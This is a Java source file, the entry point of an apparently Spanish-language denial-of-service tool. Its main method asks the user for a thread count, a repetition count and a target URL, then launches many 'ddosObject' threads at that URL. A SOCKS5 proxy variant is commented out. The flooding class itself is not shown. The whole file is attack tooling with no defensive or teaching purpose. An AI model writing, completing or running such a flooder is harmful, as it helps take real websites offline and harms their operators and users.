
package ddos;


import java.io.*;
import java.net.Socket;
import java.util.Scanner;


public class DdosClass {

        
        
    public static void main(String[] args) throws IOException, InterruptedException, ClassNotFoundException, CloneNotSupportedException {
       
        
        datosUsuario du = new datosUsuario();
        
        
        du.pedirDatos();
        
        System.out.println(du.cantidadHilos);
        System.out.println(du.cantidadRepeticiones);
        System.out.println(du.url);
        
        for(int i = 0; i< du.cantidadHilos; i++){
            Thread hilo1 = new ddosObject(du.cantidadHilos,du.url);
            hilo1.start();
            //Socks5 hilo2 = new Socks5(du.cantidadHilos,du.url);
            //hilo2.start();
        }
        
        
     
                
        
    }

   
}